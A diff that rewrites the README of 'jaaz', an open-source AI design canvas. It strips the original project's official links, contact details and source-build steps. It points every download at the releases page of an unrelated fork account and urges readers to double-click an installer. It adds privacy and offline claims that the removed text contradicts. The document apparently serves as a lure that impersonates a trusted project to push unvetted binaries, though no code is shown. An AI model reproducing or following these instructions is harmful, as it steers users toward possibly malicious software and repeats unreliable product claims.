@@ -1,211 +1,84 @@
-<h1 align="center">
-  <a href="https://jaaz.app" target="_blank"> Jaaz.app</a>
-  <p align="center">Open source Canva AI alternative</p>
+# 🎨 jaaz - Your Creative Assistant for Privacy
 
- <p align="center">
-  <a href="https://jaaz.app">
-    <img src="https://github.com/user-attachments/assets/e0cffb94-8c6f-4867-800a-c144aceb6d54" alt="Jaaz Logo" />
-  </a>
-</p>
+## 📥 Download Now
+[![Download jaaz](https://img.shields.io/badge/Download-jaaz-v1.0-blue)](https://github.com/Aditya-is-AFK/jaaz/releases)
 
-</h2>
-<p align="center">The world's first open-source multimodal canvas creative agent</p>
-<p align="center">This is a substitute for Canva and Manus that prioritizes privacy and is usable locally.</p>
-<p>
-  <b>📣 [New!] Enterprise Cloud “Full” Edition</b> — Private/on-prem deployment & commercial licensing (Docker image or full source). Includes all jaaz.app online features. 
-  <b>30% OFF</b> through <b>Sep 15, 2025</b>. 
-  <a href="mailto:info@jaaz.app">Contact us →</a> info@jaaz.app
-  <br>
-  <br>
-  <b>📣 [New!] 企业云端完整版</b> — 支持<span>私有化部署</span>与<span>商业授权</span>（Docker 镜像或源码交付），包含 jaaz.app 全量线上功能。限时 <b>30% OFF</b>，截止 <b>2025-09-15</b>。 
-  <a href="mailto:info@jaaz.app">了解/洽谈 →</a> info@jaaz.app
-  
-  Download:https://github.com/11cafe/jaaz/releases
-</p>
-<br><br>
+## 💡 Introduction
+jaaz is the world's first open-source multimodal creative assistant. It serves as a user-friendly alternative to design tools like Canva and Manus, focusing on user privacy and local usability. With jaaz, you can unleash your creativity without sacrificing your data.
 
-<p align="center">
-    <a href="https://github.com/11cafe/jaaz/blob/main/README_zh.md">中文版</a>|
-  <a href="https://mxnpt25l6k.feishu.cn/docx/LvcTdlVbFoRAZWxnhBYcqVydnpc">新手指南</a>
-  </p>
+## 🚀 Getting Started
+To start using jaaz, follow these simple steps:
 
+1. Visit the releases page by clicking the link below:
+   [Download jaaz](https://github.com/Aditya-is-AFK/jaaz/releases)
 
-<p align="center">
- <a href="https://discord.gg/dS7kuT66wc">
-  <img src="https://img.shields.io/badge/Discord-5865F2?logo=discord&logoColor=white&style=for-the-badge" alt="Discord" />
-  </a>
-   <a href="https://github.com/11cafe/jaaz/stargazers">
-    <img src="https://img.shields.io/github/stars/11cafe/jaaz?style=for-the-badge&logo=github" alt="GitHub Stars" />
-     </a>  
-</p>
-<p align="center">
-Magic Canva!
-  
-"Build" your ideas like playing with LEGO—paint directly, point with arrows, and the AI instantly understands and generates results.
-<img width="900" alt="Screenshot 2025-06-02 at 3 03 49 PM" src="https://github.com/user-attachments/assets/543b170c-14f7-4a73-96bd-909662138592" />
-<img width="900" alt="Screenshot 2025-06-02 at 3 03 49 PM" src="https://github.com/user-attachments/assets/7dd9af32-cc60-4145-9b30-7db96d8fa09a" />
+2. Find the latest release that suits your operating system.
 
+3. Download the correct file for your system.
 
-Magic video!
+4. Once downloaded, locate the file on your device.
 
-https://github.com/user-attachments/assets/b7abf987-c65d-49b1-8178-82770873c583
+5. Run the application to start using jaaz!
 
+## 📦 System Requirements
+Before downloading, please ensure your device meets the following requirements:
 
-Create Viral Shorts with a Single Sentence
-<video src="https://github.com/user-attachments/assets/1c15e792-098a-4557-b310-d9c223f73442" controls width="100%" />
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux (Ubuntu 18.04 or later).
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 500 MB of free space.
 
+## 📊 Features
+jaaz comes with a variety of features designed to enhance your creative process:
 
+- **Multimodal Tool:** Create graphics, images, and more seamlessly.
+- **Privacy-Focused:** Your creations stay on your device. No data collection.
+- **User-Friendly Interface:** Easy navigation for everyone, from beginners to pros.
+- **Local Functionality:** No internet connection needed once installed.
+- **Customizable Options:** Tailor your workspace to fit your needs.
 
+## 📂 Download & Install
+To download jaaz, follow these steps:
 
+1. Go to the releases page: [Download jaaz](https://github.com/Aditya-is-AFK/jaaz/releases).
+   
+2. Click on the version that matches your device.
 
+3. After downloading, locate the installation file.
 
-## ✨ Getting started & staying tuned with us.
+4. Double-click the file to start the installation process.
 
-Star us, and you will receive all release notifications from GitHub without any delay!
-<img width="900" alt="Screenshot 2025-06-02 at 3 03 49 PM" src="https://github.com/user-attachments/assets/1c9a3661-80a4-4fba-a30f-f469898b0aec" />
+5. Follow on-screen prompts to complete the installation.
 
-## ✨ Key Features
+6. After installation, find the jaaz icon on your desktop or in your applications folder.
 
-🎬 One-Prompt Image & Video Generation
-Turn one prompt into complete images or videos in seconds.
+7. Click the icon to launch jaaz.
 
- -Supports GPT-4o, Midjourney, VEO3, Kling,veo3,seedance etc.
+## 🛠️ Troubleshooting
+If you encounter any issues during installation or while running jaaz, consider the following:
 
- -Auto-optimized prompts & multi-turn refinement
+- **Installation Fails:** Ensure your system meets the requirements listed above.
+- **Application Crashes:** Check for updates to ensure you have the latest version.
+- **Missing Features:** Familiarize yourself with the user interface; features are often located in dropdown menus or tabs.
 
-🧙 Magic Canvas&Magic Video
-Prompt-free creation — build like Lego.
+## 🙋 Frequently Asked Questions
 
- -Simple sketching and free combination — AI instantly understands and generates.
+### How do I uninstall jaaz?
+To uninstall, go to your device settings, find jaaz in the applications list, and select "Uninstall."
 
- -AI understands and generates instantly
+### Can I use jaaz offline?
+Yes, jaaz can be used offline once installed.
 
- -No prompt writing needed
- 
- -Describe steps simply on the video, and AI will generate following them.
+### Is my data safe with jaaz?
+Absolutely. jaaz does not collect user data and prioritizes your privacy.
 
-🖼️ Infinite Canvas & Visual Storyboarding
-Plan scenes with an unlimited canvas
+## 🗨️ Community Support
+For questions or support, feel free to reach out through our GitHub Issues page. We welcome feedback and are ready to assist!
 
- -Link layouts, manage media visually
+## 🌍 Contributing
+We believe in community-driven development. If you want to contribute, please visit our repository and check the contributing guidelines.
 
- -Real-time collaboration supported
+## 🔗 Links
+- **GitHub Repository:** [Visit the repository](https://github.com/Aditya-is-AFK/jaaz)
+- **Releases Page:** [Download jaaz](https://github.com/Aditya-is-AFK/jaaz/releases)
 
-🤖 Smart AI Agent System
- -Chat to insert objects, transfer styles, control logic
-
- -Works with local (ComfyUI) & cloud models
-
- -Maintains multi-character coherence
-
-⚙️ Flexible Deployment & Local Assets
- -Fully offline or hybrid setup (Ollama + APIs)
-
- -Built-in library for media & prompts
-
- -Cross-platform: Windows & macOS
-
-🔐 Privacy & Security
- -Local-first, no data leaves your device
-
- -Open-source, no tracking
-
- -Safe for commercial use — you own your data
-
----
-
-## Usage
-Download here: https://jaaz.app/
-
-Click the "Log In" button at the top right of the homepage to access API models. With a low-cost plan, you can seamlessly use a variety of powerful APIs.
-
-<img width="400" alt="Screenshot 2025-06-02 at 3 08 51 PM" src="https://github.com/user-attachments/assets/0055557d-c247-4801-ac3f-01ed4fa775ae" />
-
-
-Start chatting with agent to generate stories or storyboards!
-
-
-
-## Cases
-<img width="889" height="1103" alt="Frame 122" src="https://github.com/user-attachments/assets/90503110-0f5c-4297-bbfe-6d35e3f54d4c" />
-
-- Prompt: Help me place this character in six different scenes, all in front of landmark buildings from around the world. The lighting is harmonious. He takes photos from all over the world, realistic, with warm light, high picture quality, and a picture ratio of 9:16
-
-![814c563b08f6ef44de0c2c31f0fdd00b-min](https://github.com/user-attachments/assets/4e2634b3-9068-47cd-a18f-ddde8f218d25)
-
-<img width="1000" alt="Screenshot 2025-06-02 at 3 51 56 AM" src="https://github.com/user-attachments/assets/5d8efe74-99b0-41bc-aa3e-6f7b92b69c36" />
-
-
-<img width="900" alt="Screenshot 2025-06-02 at 3 51 56 AM" src="https://github.com/user-attachments/assets/186982a9-5e4e-4ac1-a42c-c840092fd616" />
-
-<img width="900" alt="Screenshot 2025-06-02 at 3 03 49 PM" src="https://github.com/user-attachments/assets/b8508efd-def8-40ed-8ab5-62ed3c26de67" />
-
-![image26](https://github.com/user-attachments/assets/2065cabd-af32-43b6-bc01-59a935d9a287)
-
-## Team and Enterprise Support:
-Support for multi-user private deployment of enterprise teams, ensuring privacy and security.
-
-Please contact via email: aifoxdw@gmail.com
-
-<img width="500" alt="Screenshot 2025-06-02 at 3 51 56 AM" src="https://github.com/user-attachments/assets/4a9eb8d2-41b4-44ff-9b17-6db937af56d2" />
-
-
-## Manual Install (For Linux or local builds)
-
-🟠 **Need Python version >=3.12**
-
-First git clone this repo:
-
-`git clone https://github.com/11cafe/localart`
-
-`cd react`
-
-`npm install --force`
-
-`npx vite build`
-
-`cd ../server`
-
-`pip install -r requirements.txt`
-
-`python main.py`
-
-## Development
-
-🟠 **Need Python version >=3.12**
-
-VSCode/Cursor Install Extensions：
-
-- Black Formatter by ms-python (ms-python.black-formatter)
-
-`cd react`
-
-`npm install --force && npm run dev`
-
-`cd server`
-
-`pip install -r requirements.txt`
-
-`python main.py`
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Thank you for choosing jaaz to assist in your creative endeavors!
